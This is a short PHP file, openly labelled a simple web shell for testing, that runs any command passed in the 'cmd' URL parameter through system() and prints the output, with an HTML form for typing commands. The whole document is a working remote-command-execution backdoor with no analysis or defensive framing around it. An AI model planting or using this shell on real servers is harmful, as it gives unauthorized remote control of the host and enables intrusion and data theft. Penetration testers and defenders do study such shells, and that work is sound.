<?php
// Simple webshell for testing
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
<html>
<body>
<h1>Simple Web Shell</h1>
<form method="GET">
    Command: <input type="text" name="cmd">
    <input type="submit" value="Execute">
</form>
</body>
</html>
